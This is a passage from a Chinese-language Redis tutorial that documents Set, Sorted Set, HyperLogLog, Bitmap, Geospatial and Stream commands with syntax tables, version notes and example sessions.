从哈希中获取一个或多个随机字段[WITHVALUES]：返回结果包含value



实战场景

缓存：相比String更节省空间，能直观的维护缓存信息，如用户信息，视频信息等。

Set：无序集合
Redis 集是唯一字符串（成员）的无序集合。您可以使用 Redis 集高效地：

跟踪唯一项目（例如，跟踪访问给定博客文章的所有唯一 IP 地址）
表示关系（例如，具有给定角色的所有用户的集合）
执行常见的集合运算，例如交集、并集和差集

实战场景

标签（tag）,给用户添加标签，或者用户给消息添加标签，这样有同一标签或者类似标签的可以给推荐关注的事或者关注的人。
点赞，或点踩，收藏等，可以放到set中实现




命令
使用
功能
说明




SADD
SADD key member [member …]
增
向集合中添加一个或多个成员


SCARD
SCARD key
查
集合中元素个数


SDIFF
SDIFF key [key …]
集合：补
取多个集合的差分（其他集合中都没有的元素）


SDIFFSTORE
SDIFFSTORE destination key [key …]
集合：补&amp;存
取多个集合的差分, 并将结果集存储在一个集合中


SINTER
SINTER key [key …]
集合：交
取多个集合的交集并返回 INTER 为 Intersect /ˌɪntəˈsekt/ 的缩写


SINTERSTORE
SINTERSTORE destination key [key …]
集合：交&amp;存
取多个集合的交集并将结果集存储在一个集合中（destination）


SISMEMBER
SISMEMBER key member
查
检查一个元素是否存在


SMEMBERS
SMEMBERS key
查
返回所有元素


SMOVE
SMOVE source destination member
查&amp;移动
将集合source 中的元素member移动到集合destination中


SPOP
SPOP key [count]
查&amp;删
从集合中移除并返回一个或多个（count）随机成员


SRANDMEMBER
SRANDMEMBER key [count]
查
从集合中获取一个或多个（count）随机成员，元素在集合中依然存在


SREM
SREM key member [member …]
删
从SET中删除一个或者多个元素


SUNION
SUNION key [key …]
集合：并
取多个集合的并集


SUNIONSTORE
SUNIONSTORE destination key [key …]
集合：并&amp;存
取多个集合的并集并将结果集存储在一个集合中（destination）


SSCAN
SSCAN key cursor [MATCH pattern] [COUNT count]
遍历查
参考SCAN




其他（6.0.6以下版本不支持）




命令
使用
发行版本
功能
说明




SINTERCARD
SINTERCARD numkeys key [key …] [LIMIT limit]
7.0.0
集合：交
获取两个集合的交集数量[LIMIT  limit]：最大交集量 SINTERCARD 2 testset testset1返回19 两个集合的交集量容量为19 SINTERCARD 2 testset testset1 limit 10 返回10


SMISMEMBER
SMISMEMBER key member [member …]
6.2.0
查
返回每个成员是否是存储在 key  集合的成员（多个元素的存在的查询） 返回与指定的member顺序一致的数组



Zset : 有序集合
Redis 排序集是由相关分数排序的唯一字符串（成员）的集合。当多个字符串具有相同的分数时，这些字符串按字典顺序排列。排序集的一些用例包括：


排行榜。例如，您可以使用排序集轻松维护大型在线游戏中最高分的有序列表。


速率限制器。特别是，您可以使用排序集来构建滑动窗口速率限制器，以防止过多的 API 请求。


Sorted Set 中的每个元素都与一个浮点值相关联，称为score 。所以Sorted Set 也是一种Hash结构。
排序规则：


如果 A 和 B 是具有不同分数的两个元素， A.score &gt; B.score，则 A &gt; B 。


如果 A 和 B 具有完全相同的分数，如果 A 字符串在字典顺序上大于 B 字符串，则 A &gt; B。A 和 B 字符串不能相等，因为排序集只有唯一元素


实战场景

排行榜：小说视频等网站需要对用户上传的小说视频做排行榜，榜单可以按照用户关注数，更新时间，字数等打分，做排行。




命令
使用
功能
说明




ZADD
ZADD key [NX | XX] [GT | LT] [CH] [INCR]  score member [score member   …]
增
为有序集合添加一个/多个元素，若元素存在，则修改元素的score - XX:  只更新已经存在的元素。不添加新元素。- NX:   只添加新元素。 不要更新已经存在的元素. - LT:   如果新分数小于当前分数，则仅更新现有元素。 此标志不会阻止添加新元素。- GT:  如果新分数大于当前分数，则仅更新现有元素。 此标志不会阻止添加新元素。- CH:  通常ZADD的返回值只计算添加的新元素的数量，此命令将返回值则为更改的元素总数（CH 是 changed 的缩写），即：添加的新元素和已经存在且分数被更新的元素。  INCR:   此命令类似于ZINCRBY。在此模式下只能指定一个分数元素对。注意: GT、LT 和 NX 选项是互斥的。


ZCARD
ZCARD key
查
返回存储在 key 处的有序集合元素数 card: cardinality 基数


ZCOUNT
ZCOUNT key min max
查
用给定值内的分数计算有序集合元素数（包含min 和 max）


ZINCRBY
ZINCRBY key increment member
查&amp;改
将存储在 key 的有序集合中的成员的分数按增量递增 ① 如果成员在排序集中不存在，则将其添加为增量作为其分数（就像它之前的分数是 0.0） ② 如果 key 不存在，则创建一个以指定成员为唯一成员的新排序集。


ZLEXCOUNT
ZLEXCOUNT key min max
查
该命令返回有序集合中指定字典范围内的元素个数。① 当一个有序集合中的所有元素以相同的分数插入时，强制使用字典顺序② min 和 max 的定义类似 ZRANGEBYLEX


ZPOPMAX
ZPOPMAX key [count]
查&amp;删
从一个key，弹出多个成员删除并返回存储在排序集（key）中得分最高的 count个成员。


BZPOPMAX
BZPOPMAX key [key …] timeout
查&amp;删
 从多个key，弹出一个成员从一个或多个排序集（key [key …]）删除并返回得分最高的成员无数据，则阻塞等待，直到有一个key可用。


ZPOPMIN
ZPOPMIN key [count]
查&amp;删
从一个key，弹出多个成员删除并返回存储在 key 的排序集中得分最低的 count个 成员


BZPOPMIN
BZPOPMIN key [key …] timeout
查&amp;删
从多个key，弹出一个成员从一个或多个排序集中删除并返回得分最低的成员，或阻止，直到有一个可用


ZRANGE
ZRANGE key start stop [WITHSCORES]
查
有序集合，返回指定index范围的元素 [WITHSCORES]：一并返回元素分值 举例： ZRANGE hackers 0 -1 WITHSCORES


ZRANK
ZRANK key member
查
返回 member 在存储在 key 的有序集合中的排名，分数从低到高排序。排名（或索引）从 0 开始


ZREVRANK
ZREVRANK key member
查
返回 member 在存储在 key 的有序集合中的排名，分数从高到低排序。排名（或索引）从 0 开始，这意味着得分最高的成员的排名为 0


ZREM
ZREM key member [member …]
删
从存储在 key 的排序集中删除指定的成员不存在的成员将被忽略


ZREMRANGEBYLEX
ZREMRANGEBYLEX key min max
删
删除给定字典序范围内的元素（闭区间）


ZREMRANGEBYRANK
ZREMRANGEBYRANK key start stop
删
删除指定位置区间内的元素（闭区间）


ZREMRANGEBYSCORE
ZREMRANGEBYSCORE key min max
删
删除分数介于 min 和 max 之间的元素 （闭区间）


ZSCORE
ZSCORE key member
查
获取与排序集合中给定成员关联的分数


ZSCAN
ZSCAN key cursor [MATCH pattern] [COUNT count]
查
增量迭代排序集元素和相关分数。使用方法可以参考SCAN




集合操作（6.0.6 之前）




命令
功能
说明




ZINTERSTORE destination numkeys key [key …] [WEIGHTS weight   [weight …]] [AGGREGATE &lt;SUM |MIN |MAX&gt;]
交集
计算多个有序集合的交集，并保存到destination 中。[WEIGHTS weight   [weight …]] ：使用此选项，可以为每个输入排序集指定一个乘法因子。① 每个输入排序集中的每个元素的分数在传递给聚合函数之前都会乘以该因子。② 当未给出 WEIGHTS 时，乘法因子默认为 1。[AGGREGATE &lt;SUM |MIN |MAX&gt;] : destination 中元素的分数的计算方式。默认为求和。


ZUNIONSTORE destination numkeys key [key …] [WEIGHTS weight   [weight …]] [AGGREGATE &lt;SUM |MIN |MAX&gt;]
并集
计算多个有序集合的并集，并保存到destination 中。如果destination已经存在，它会被覆盖。[WEIGHTS weight   [weight …]] ：使用此选项，可以为每个输入排序集指定一个乘法因子① 每个输入排序集中的每个元素的分数在传递给聚合函数之前都会乘以该因子。② 当未给出 WEIGHTS 时，乘法因子默认为 1。[AGGREGATE &lt;SUM |MIN |MAX&gt;] : destination 中元素的分数的计算方式。默认为求和。




集合操作（6.0.6 之后）




命令
功能
版本
说明




ZINTER numkeys key [key …] [WEIGHTS weight [weight …]]   [AGGREGATE &lt;SUM |MIN |MAX&gt;] [WITHSCORES]
交集
6.2.0
计算多个有序集合的交集，并返回


ZUNION numkeys key [key …] [WEIGHTS weight [weight …]]   [AGGREGATE &lt;SUM |MIN |MAX&gt;] [WITHSCORES]
并集
6.2.0
计算多个有序集合的并集，并返回


ZDIFF numkeys key [key …] [WITHSCORES]
补集
6.2.0
计算第一个集合比后面所有集合多出的元素，并返回（比较逻辑和分值无关）


ZDIFFSTORE destination numkeys key [key …]
补集
6.2.0
计算第一个集合比后面所有集合多出的元素，并存入destination（比较逻辑和分值无关）




其他（6.0.6以下版本不支持）




命令
使用
发行版本
功能
说明




ZRANDMEMBER
ZRANDMEMBER key [count [WITHSCORES]]
6.2.0
查
从有序集合中返回一个或多个元素如果提供的 count 参数为正，则返回不同元素的数组。数组的长度是计数或排序集的基数 (ZCARD)，以较低者为准。如果以负数调用，则行为会发生变化，并且允许该命令多次返回相同的元素。在这种情况下，返回元素的数量是指定计数的绝对值。


ZRANGE
ZRANGE key start  stop [BYSCORE |BYLEX] [REV] [LIMIT offset count]   [WITHSCORES]
6.2.0
查
此命令可以替换以下命令：ZREVRANGE、ZRANGEBYSCORE、ZREVRANGEBYSCORE、ZRANGEBYLEX 和 ZREVRANGEBYLEX [BYSCORE |BYLEX] ：根据分值查找/ 根据字典顺序zrange hackers  + - bylex rev


ZRANGESTORE
ZRANGESTORE dst  src min max   [BYSCORE | BYLEX]   [REV]   [LIMIT offset   count]
6.2.0
查&amp;存
ZRANGE 查询结果结果存储在目标键dst 中


ZMSCORE
ZMSCORE key member [member …]
6.2.0
查
查询指定成员关联的分数对于排序集中不存在的每个成员，返回一个 nil 值。


ZINTERCARD
ZINTERCARD numkeys key [key …] [LIMIT limit]
7.0.0
集合：交
返回交集元素总量 [LIMIT limit]：默认为 0，表示无限制。如果交集元素总量在计算过程中达到极限，算法将退出并将limit 作为交集总量ZINTERCARD 2 zset1 zset2 LIMIT 1:   返回 1


ZMPOP
ZMPOP numkeys key [key …] &lt;MIN | MAX&gt; [COUNT count]
7.0.0
删
从多个key，弹出多个成员从提供的键名列表中的第一个非空排序集中弹出一个或多个成员


BZMPOP
BZMPOP timeout numkeys key [key …] &lt;MIN | MAX&gt; [COUNT count]
7.0.0
删
 从多个key，弹出多个成员有序集合中存在数据时返回，不存在时阻塞等待。timeout：double数，时间单位为秒，设置为0时无期限等待




6.2.0之后已被弃用，被合并到ZRANGE




命令
功能
说明




ZREVRANGE  key start stop [WITHSCORES]
查
按照分值降序后，返回有序集合中指定index范围的元素


ZRANGEBYLEX key min max [LIMIT offset count]
查
该命令返回有序集合中指定字典范围内的元素① 当排序集中的所有元素以相同的分数插入时，使用字典顺序，② 此命令返回排序集中的所有元素在 key 处，其值介于 min 和 max 之间。③ 如果排序集中的元素具有不同的分数，则返回的元素是未指定的 ZRANGEBYLEX  hackers - +  ZRANGEBYLEX  hackers - + LIMIT 2 3  ZRANGEBYLEX  hackers [A [Z：包含ZRANGEBYLEX  hackers (A (Z：不包含


ZREVRANGEBYLEX key max min [LIMIT offset count]
查



ZRANGEBYSCORE key min max [WITHSCORES] [LIMIT offset count]
查
按照分值降序后，返回有序集合中指定分值范围的元素举例：zrangebyscore hackers -inf 1950==-inf==: 表示负无穷 infinity [ɪnˈfɪnəti]


ZREVRANGEBYSCORE key max min [WITHSCORES] [LIMIT offset count]
查




HyperLogLogs（基数统计）

Redis 2.8.9 版本更新了 Hyperloglog 数据结构



什么是基数？
举个例子，A = {1, 2, 3, 4, 5}， B = {3, 5, 6, 7, 9}；那么基数（不重复的元素）= 1, 2, 4, 6, 7, 9； （允许容错，即可以接受一定误差）


HyperLogLogs 基数统计用来解决什么问题？
这个结构可以非常省内存的去统计各种计数，比如注册 IP 数、每日访问 IP 数、页面实时UV、在线用户数，共同好友数等。


它的优势体现在哪？
一个大型的网站，每天 IP 比如有 100 万，粗算一个 IP 消耗 15 字节，那么 100 万个 IP 就是 15M。而 HyperLogLog 在 Redis 中每个键占用的内容都是 12K，理论存储近似接近 2^64 个值，不管存储的内容是什么，它一个基于基数估算的算法，只能比较准确的估算出基数，可以使用少量固定的内存去存储并识别集合中的唯一元素。而且这个估算的基数并不一定准确，是一个带有 0.81% 标准错误的近似值（对于可以接受一定容错的业务场景，比如IP数统计，UV等，是可以忽略不计的）


相关命令使用
# PFADD key [element [element ...]]&gt; PFADD key1 a b c d e f g h i	# 创建第一组元素(integer) 1# 统计元素的基数数量# PFCOUNT key [key ...]&gt; PFCOUNT key1					(integer) 9# 创建第二组元素&gt; PFADD key2 c j k l m e g a		(integer) 1&gt; PFCOUNT key2(integer) 8# 合并两组：key1 key2 -&gt; key3 并集# PFMERGE destkey sourcekey [sourcekey ...]&gt; PFMERGE key3 key1 key2			OK&gt; pfcount key3(integer) 13


Bitmap （位存储）

Bitmap 即位图数据结构，都是操作二进制位来进行记录，只有0 和 1 两个状态。



用来解决什么问题
比如：统计用户信息，活跃，不活跃； 登录，未登录；打卡，不打卡； 两个状态的，都可以使用 Bitmaps！
如果存储一年的打卡状态需要多少内存呢？ 365 天 = 365 bit 1字节 = 8bit 46 个字节左右


相关命令使用
使用bitmap 来记录 周一到周日的打卡！ 周一：1 周二：0 周三：0 周四：1 …
# SETBIT key offset value&gt; setbit sign 0 1(integer) 0&gt; setbit sign 1 1(integer) 0&gt; setbit sign 2 0(integer) 0&gt; setbit sign 3 1(integer) 0&gt; setbit sign 4 0(integer) 0&gt; setbit sign 5 0(integer) 0&gt; setbit sign 6 1(integer) 0
查看某一天是否有打卡
# GETBIT key offset&gt; getbit sign 3(integer) 1&gt; getbit sign 5(integer) 0
统计操作，统计 打卡的天数
# BITCOUNT key [start end [BYTE | BIT]]# BITCOUNT 统计的是二进制后的数据&gt; bitcount sign # 统计这周的打卡记录，就可以看到是否有全勤！(integer) 3# 111001101001100010101111&gt; SET test 谳OK&gt; BITCOUNT test(integer) 12




GETBIT key offset


SETBIT key offset value


BITCOUNT key [start end [BYTE | BIT]]


BITOP operation destkey key [key …] ： 在多个键(包含字符串值)之间执行位操作，并将结果存储在目标键中
BITOP AND destkey srckey1 srckey2 srckey3 ... srckeyNBITOP OR destkey srckey1 srckey2 srckey3 ... srckeyNBITOP XOR destkey srckey1 srckey2 srckey3 ... srckeyNBITOP NOT destkey srckey


BITPOS key bit [start [end [BYTE | BIT]]]   返回字符串中第一个位设置为1或0的位置


Geospatial (地理位置)

这个功能可以推算地理位置的信息: 两地之间的距离, 方圆几里的人

有效的经度从-180度到180度。
有效的纬度从-85.05112878度到85.05112878度。


GEOADD：添加地理位置
GEOADD key [NX | XX] [CH] longitude latitude member  [longitude
latitude member …]
&gt; GEOADD china:city 118.76 32.04 nanjing 112.55 37.86 taiyuan 123.43 41.80 shenyang(integer) 3&gt; GEOADD china:city 144.05 22.52 shengzhen 120.16 30.24 hangzhou 108.96 34.26 xian(integer) 3
规则
两级无法直接添加，我们一般会下载城市数据(这个网址可以查询 GEO： http://www.jsons.cn/lngcode)！
# 当坐标位置超出上述指定范围时，该命令将会返回一个错误。&gt; GEOADD china:city 39.90 116.40 beijin(error) ERR invalid longitude,latitude pair 39.900000,116.400000


存储：将二维的经纬度转换为一维的HASH 值

GEOPOS：获取指定的成员的经度和纬度
获得当前定位, 一定是一个坐标值
&gt; GEOPOS china:city taiyuan nanjing1) 1) "112.54999905824661255"   2) "37.86000073876942196"2) 1) "118.75999957323074341"   2) "32.03999960287850968"
GEODIST：计算两点之间的距离
GEODIST key member1 member2  [M | KM | FT | MI]

m
km
mi 英里
ft 英尺

&gt; GEODIST china:city taiyuan shenyang KM"1026.4391"# 位置不存在，返回为空&gt; GEODIST china:city chengdou shenyang KM(nil)
GEOHASH： 该命令返回11个字符的HASH字符串
&gt; GEOHASH china:city taiyuan shenyang1) "ww8p3hhqmp0"2) "wxrvb9qyxk0"
GEOSEARCH：地理位置查询

版本6.2.0 之后新增

GEOSEARCH key &lt;FROMMEMBER member | FROMLONLAT longitude latitude&gt;
&lt;BYRADIUS radius &lt;M | KM | FT | MI&gt; | BYBOX width height &lt;M | KM |
FT | MI&gt;&gt;  [ASC | DESC]  [COUNT count [ANY]] [WITHCOORD] [WITHDIST]
[WITHHASH]
&gt; GEOSEARCH china:city FROMMEMBER nanjing BYRADIUS 10000 KM 1) "nanjing"2) "taiyuan"3) "shenyang"&gt; GEOSEARCH china:city FROMMEMBER nanjing BYRADIUS 10000 KM WITHDIST1) 1) "nanjing"   2) "0.0000"2) 1) "taiyuan"   2) "859.5256"3) 1) "shenyang"   2) "1161.7864"   &gt; GEOSEARCH china:city FROMMEMBER nanjing BYRADIUS 10000 KM WITHDIST WITHCOORD1) 1) "nanjing"   2) "0.0000"   3) 1) "118.75999957323074341"      2) "32.03999960287850968"2) 1) "taiyuan"   2) "859.5256"   3) 1) "112.54999905824661255"      2) "37.86000073876942196"3) 1) "shenyang"   2) "1161.7864"   3) 1) "123.42999905347824097"      2) "41.79999919077864234"
GEOSEARCHSTORE
GEOSEARCHSTORE destination source  &lt;FROMMEMBER member | FROMLONLAT longitude latitude&gt;
&lt;BYRADIUS radius &lt;M | KM | FT | MI&gt; | BYBOX width height &lt;M | KM |
FT | MI&gt;&gt;  [ASC | DESC]  [COUNT count [ANY]] [STOREDIST]
此命令类似于GEOSEARCH，但将结果存储在目标键中。
&gt; GEOSEARCHSTORE test china:city FROMMEMBER nanjing BYRADIUS 10000 KM(integer) 3

GEORADIUS：获得所有附近的人的地址, 定位, 通过半径来查询（6.2.0之后弃用）

从Redis版本6.2.0开始，此命令被认为已弃用。可将其替换为GEOSEARCH和GEOSEARCHSTORE，并使用BYRADIUS参数

GEORADIUS key longitude latitude radius  &lt;M | KM | FT | MI&gt;
[WITHCOORD] [WITHDIST] [WITHHASH] [COUNT count [ANY]] [ASC | DESC]
[STORE key] [STOREDIST key]

WITHDIST : 返回距离
WITHCOORD：返回坐标
WITHHASH：返回坐标的HASH值（ZSET的SCORE值）
COUNT count：显示结果的数量

# 以 100,30 这个坐标为中心, 寻找半径为1000km的城市&gt; GEORADIUS china:city 110 30 1000 km			1) "xian"2) "hangzhou"3) "nanjing"4) "taiyuan"&gt; GEORADIUS china:city 110 30 500 km1) "xian"&gt; GEORADIUS china:city 110 30 500 km WITHDIST1) 1) "xian"   2) "483.8340"&gt; GEORADIUS china:city 110 30 1000 km WITHCOORD WITHDIST count 21) 1) "xian"   2) "483.8340"   3) 1) "108.96000176668167114"      2) "34.25999964418929977"2) 1) "nanjing"   2) "864.9816"   3) 1) "118.75999957323074341"      2) "32.03999960287850968"
GEORADIUSBYMEMBER： 显示与指定成员一定半径范围内的其他成员（6.2.0之后弃用）

从Redis版本6.2.0开始，此命令被认为已弃用。 可将其替换为GEOSEARCH和GEOSEARCHSTORE，并使用BYRADIUS和FROMMEMBER参数

GEORADIUSBYMEMBER key member radius &lt;M | KM | FT | MI&gt; [WITHCOORD]
[WITHDIST] [WITHHASH] [COUNT count [ANY]] [ASC | DESC] [STORE key]
[STOREDIST key]
&gt; GEORADIUSBYMEMBER china:city taiyuan 1000 km1) "nanjing"2) "taiyuan"3) "xian"&gt; GEORADIUSBYMEMBER china:city taiyuan 1000 km withcoord WITHDIST count 21) 1) "taiyuan"   2) "0.0000"   3) 1) "112.54999905824661255"      2) "37.86000073876942196"2) 1) "xian"   2) "514.2264"   3) 1) "108.96000176668167114"      2) "34.25999964418929977"
Redis Stream
Redis Stream 是一种数据结构，其作用类似于an append-only log。您可以使用流实时记录和同步事件。
Redis Stream 用例的示例包括：

事件溯源（例如，跟踪用户操作、点击等）
传感器监控（例如，现场设备的读数）
通知（例如，将每个用户的通知记录存储在单独的流中）

Redis 为每个流条目生成一个唯一的 ID。您可以使用这些 ID 稍后检索其关联条目或读取和处理流中的所有后续条



命令
使用
功能
说明




XADD

增
唯一可以将数据添加到流的 Redis 命令


XRANGE/ XREVRANGE

查
返回流中的一段元素


XREAD

查
从一个或多个流中读取数据，只返回 ID 大于调用者报告的最后接收到的 ID 的条目


XTRIM
XTRIM key &lt;MAXLEN |MINID&gt; [= |~] threshold [LIMIT count]
删
将流修剪到 (如果传入’~'，则大约) 某个大小


XDEL
XDEL key id [id …]




XINFO
1. XINFO STREAM key [FULL [COUNT count]]2. XINFO GROUPS key3. XINFO CONSUMERS key groupname 
查



XLEN
XLEN key
查
返回流中的条目数


XSETID
XSETID key last-id  [ENTRIESADDED entries_added]  [MAXDELETEDID max_deleted_entry_id]
改
XSETID 命令是一个内部命令。 Redis 主服务器使用它来复制最后交付的流 ID。









消息分组



命令
使用
功能
说明




XGROUP CREATE
XGROUP CREATE key groupname  &lt;id |$ &gt;  [MKSTREAM] [ENTRIESREAD entries_read]
增
创建消费者组


XGROUP CREATECONSUMER
XGROUP CREATECONSUMER key groupname consumername
增
在消费者组中创建消费者


XGROUP DELCONSUMER
XGROUP DELCONSUMER key groupname consumername
删
删除消费者


XGROUP DESTROY
XGROUP DESTROY key groupname
删
消费者组


XGROUP SETID
XGROUP SETID key groupname  &lt;id |$ &gt;  [ENTRIESREAD entries_read]
改
修改消费者组的最后一个交付ID


XREADGROUP
XREADGROUP GROUP group consumer [COUNT count]  [BLOCK milliseconds]  [NOACK] STREAMS key [key …] id [id …]
查/改
从消费者组返回新条目，或者访问给定消费者的待处理条目的历史记录


XPENDING
XPENDING key group [[IDLE min-idle-time] start end count [consumer]]
查
从消费者组PEL中 返回获取了但从未确认的消息信息和条目


XCLAIM
XCLAIM  key group consumer  min-idle-time id [id …] [IDLE ms]   [TIME unix-time-milliseconds] [RETRYCOUNT count] [FORCE] [JUSTID]   [LASTID id]

更改(或获得)使用者组中消息的所有权，就像消息已交付给指定的使用者一样。


XAUTOCLAIM


更改(或获取)使用者组中消息的所有权，就像将消息交付给指定的使用者一样。


XACK
XACK key group id [id …]

将挂起的消息标记为正确处理，有效地将其从使用者组的挂起条目列表中删除。该命令的返回值是成功确认的消息的数量，也就是说，我们实际上能够在PEL中解析的id。



XADD


命令详情
XADD key  [NOMKSTREAM]  [&lt;MAXLEN | MINID&gt; [= | ~] threshold [LIMIT count]]   &lt;* | id&gt;  field value [field value …]


命令参数解释


可以使用 NOMKSTREAM 选项禁用 Stream key 的创建（key不存在时，返回null）


&lt;* | id&gt;  id组成方式：&lt;millisecondsTime&gt;-&lt;sequenceNumber&gt;


如果指定的 ID 参数是 *字符，XADD 命令将为您自动生成唯一 ID
XADD stream:test:1 * ip 127.0.0.1


虽然仅在极少数情况下有用，但可以指定格式良好的 ID，以便将使用指定的 ID 精确添加新条目。
XADD stream:test:1 1662020231547-1 ip 127.0.0.2
当用户为 指定显式 ID 时XADD，最小有效 ID 为 0-1，并且用户必须指定一个大于当前流内任何其他 ID 的 ID，否则该命令将失败并返回错误。
通常，仅当您有另一个系统生成唯一 ID（例如 SQL 表）并且您确实希望 Redis 流 ID 与另一个系统匹配时，才使用特定 ID。




[&lt;MAXLEN | MINID&gt; [= | ~] threshold
[LIMIT count]]    封顶（Capped streams）
MAXLEN：使用 MAXLEN，当达到指定长度时，旧条目会被自动驱逐
~：表示封顶的阈值 count是一个近似值。MAXLEN ~ 1000我真的不需要这正好是 1000 个项目。它可以是 1000 或 1010 或 1030，只要确保至少保存 1000 个项目即可（常用场景）
MINID：驱逐 ID 低于阈值的条目，其中阈值是流 ID
&gt; XADD mystream 1526919030474-55 message "Hello," &gt; XADD mystream 1526919030474-* message " World!"&gt; XADD mystream MAXLEN ~ 1000 * ... entry fields here ...&gt; XADD stest MINID = 1670928883730-0 * name zs age 12




版本变更
版本6.2.0 前：XADD key ID field string [field string …]
版本6.2.0后 ：添加了 **NOMKSTREAM 、MINID、  LIMIT **
版本7.0.0 ： 添加了对 显式 ID 形式的支持


XRANGE


详细命令
XRANGE key startId endId [COUNT count]


命令参数解释


startId endId:  startId 和 endId 之间为闭区间


-和 + 特殊 ID 分别表示流中可能的最小 ID 和可能的最大 ID，因此以下命令将仅返回流中的所有条目：XRANGE somestream - +
-: 可以理解为：0-0
+: 可以理解为：18446744073709551615-18446744073709551615


Incomplete IDs
不完整指定的ID：仅仅指定 UNIX 时间部分：XRANGE somestream 1526985054069 1526985055069
在这种情况下，XRANGE 将使用 -0 自动完成开始间隔，使用 -18446744073709551615 自动完成结束间隔，以便返回在给定毫秒和另一个指定毫秒结束之间生成的所有条目。
这也意味着重复相同的毫秒两次，我们得到指定毫秒内的所有条目
以这种方式使用 XRANGE 作为范围查询命令来获取指定时间内的条目。这对于获取一段时间内的操作历史，非常方便。


Exclusive ranges
开区间范围查询：ID 前加上字符(来指定一个开区间：XRANGE somestream (1526985685298-0 + COUNT 2




[COUNT count] : 返回结果的前count条entry




使用场景介绍


stream 迭代
a. 上次查询的entry的id 用 开区间 (，作为下次查询的start 。
b. 我们可以从任何 ID 开始迭代（指定一个不完整的start id）
&gt; XRANGE writers - + COUNT 21) 1) 1526985676425-0   2) 1) "name"      2) "Virginia"      3) "surname"      4) "Woolf"2) 1) 1526985685298-0   2) 1) "name"      2) "Jane"      3) "surname"      4) "Austen"&gt; XRANGE writers (1526985685298-0 + COUNT 21) 1) 1526985691746-0   2) 1) "name"      2) "Toni"      3) "surname"      4) "Morrison"2) 1) 1526985712947-0   2) 1) "name"    2) "Agatha"      3) "surname"    4) "Christie"


获取单个项目
XRANGE 的参数中指定两次 ID：XRANGE mystream 1526984818136-0 1526984818136-0




XREVRANGE


详细命令
XREVRANGE key end start [COUNT count]


举例
XREVRANGE somestream + - COUNT 1


XREAD


命令详情
XREAD [COUNT count] [BLOCK milliseconds] STREAMS key [key …] id
[id …]


命令参数解释
STREAMS key [key …] id [id …]：指定了一个键列表以及调用消费者已经为每个流看到的相应最大 ID，因此该命令将只向客户端提供 ID  大于我们指定的 ID 的消息。（不包含指定的ID）
[BLOCK milliseconds]：阻塞的毫秒数。若milliseconds 设置为0 ，则表示永远不会超时
[COUNT count]：限定调用将在每个流中最多返回count个元素


特殊的ID$
STREAMS $ :  意味着应该使用已经存储在流中的最大 ID 作为最后一个 ID。
当阻塞时，有时我们希望只接收从阻塞那一刻开始通过XADD添加到流中的条目。在这种情况下，我们对已经添加的条目的历史不感兴趣。
对于这个用例，我们必须检查流顶部元素的ID，并在XREAD命令行中使用这样的ID。这是不干净的，需要调用其他命令，所以可以使用特殊的 $ 来通知流，我们只想要新的东西。
仅在第一次调用 XREAD 时使用 $ ID 非常重要。之后迭代的ID应该是流中最后报告的ID，否则您可能会错过中间添加的所有条目。



客户端A
客户端B
客户端C




&gt; XREAD COUNT 1 block 30000 STREAMS test $
&gt; XREAD COUNT 1 block 30000 STREAMS test $





&gt; xadd test * name wangwu age 221675666852907-0


test1675666852907-0namewangwuage22
test1675666852907-0namewangwuage22





客户端C 发送消息时，阻塞等待的客户端A、客户端B 均接受到了流中新增条目



使用场景


非阻塞情况：从多个流读取数据（XRANGE 的扩展版本）
&gt; XREAD COUNT 2 STREAMS mystream writers 0-0 0-01) 1) "mystream"   2) 1) 1) 1526984818136-0         2) 1) "duration"            2) "1532"            3) "event-id"            4) "5"            5) "user-id"            6) "7782813"      2) 1) 1526999352406-0         2) 1) "duration"            2) "812"            3) "event-id"            4) "9"            5) "user-id"            6) "388234"2) 1) "writers"   2) 1) 1) 1526985676425-0         2) 1) "name"            2) "Virginia"            3) "surname"            4) "Woolf"      2) 1) 1526985685298-0         2) 1) "name"            2) "Jane"            3) "surname"            4) "Austen"


阻塞情况下：（无返回数据的情况下，等待数据返回）
消费者第一次迭代：从我们开始收听的时间开始，阻塞等待最新消息
&gt; XREAD BLOCK 5000 COUNT 100 STREAMS mystream $
一旦我们得到一些回复，下一次调用将是这样的：阻塞等待1526999644174-3之后的数据
&gt; XREAD BLOCK 5000 COUNT 100 STREAMS mystream 1526999644174-3




如何为单个流上被阻止的多个客户端提供服务：FIFO


当新项目可用时，为给定流阻塞的第一个客户端将是第一个被解除阻塞的客户端。因为从等待数据的客户端的角度来看，阻塞流读取是公平的，其语义是 FIFO 风格。（类似于阻塞队列）


为客户端提供服务时，不会从流中删除流条目，因此只要 XADD 命令向流提供数据，就会为每个等待的客户端提供服务。（不同于阻塞队列）




 XTRIM


命令详情
XTRIM key &lt;MAXLEN | MINID&gt; [= | ~] threshold [LIMIT count]


命令参数解释
MAXLEN:  只要流的长度超过指定的阈值，就逐出条目，其中阈值是一个正整数。
MINID: 驱逐 ID 低于阈值的条目，其中阈值是流 ID。


返回：成功移除数据量


示范


精确修剪=
XTRIM mystream MAXLEN 1000XTRIM mystream MINID 649085820


近乎精确的修剪
XTRIM mystream MAXLEN ~ 1000




 XINFO
XINFO STREAM


命令详情
XINFO STREAM key [FULL [COUNT count]]：


此命令返回有关存储在  中的流的信息。详细信息是：

length: 流中的条目数
radix-tree-keys: 底层基数数据结构中的键数
radix-tree-nodes: 底层基数数据结构中的节点数
groups: 底层基数数据结构中的节点数 groups：为流定义的消费者组数
last-generated-id:添加到流中的最近条目的 ID
max-deleted-entry-id: 从流中删除的最大条目 ID
entries-added: 在其生命周期内添加到流中的所有条目的计数
first-entry: 流中第一个条目的 ID 和字段值元组
last-entry: 流中最后一个条目的 ID 和字段值元组



XINFO GROUPS


命令详情
XINFO GROUPS key


XINFO CONSUMERS


命令详情
XINFO CONSUMERS key groupname


 XGROUP


XGROUP 用于创建、销毁和管理消费者组。


XREADGROUP 用于通过消费者组从流中读取。


XACK 是允许消费者将未决消息标记为已正确处理的命令。


 XGROUP CREATE


命令详情
XGROUP CREATE key groupname   &lt;id | $ &gt;   [MKSTREAM]  [ENTRIESREAD entries_read]


参数说明


 &lt;id | $ &gt;  ：从新组的角度指定流中最后传送的条目。
例如，如果您希望组的消费者从头开始获取整个流，使用零作为消费者组的起始 ID。特殊 ID $ 是指流中最后一个条目的 ID


[MKSTREAM]: 流不存在时，自动创建，否则返回 key不存在的异常
ERR The XGROUP subcommand requires the key to exist. Note that for CREATE you may want to use the MKSTREAM option to create an empty stream automatically.


[ENTRIESREAD entries_read]
从 指定的  &lt;id | $ &gt;，到最后一个条目，指定读取的条目容量




功能说明
创建消费者组


XGROUP CREATECONSUMER


命令详情
XGROUP CREATECONSUMER key groupname consumername


功能说明
在消费者组中创建消费者


XGROUP DELCONSUMER


命令详情
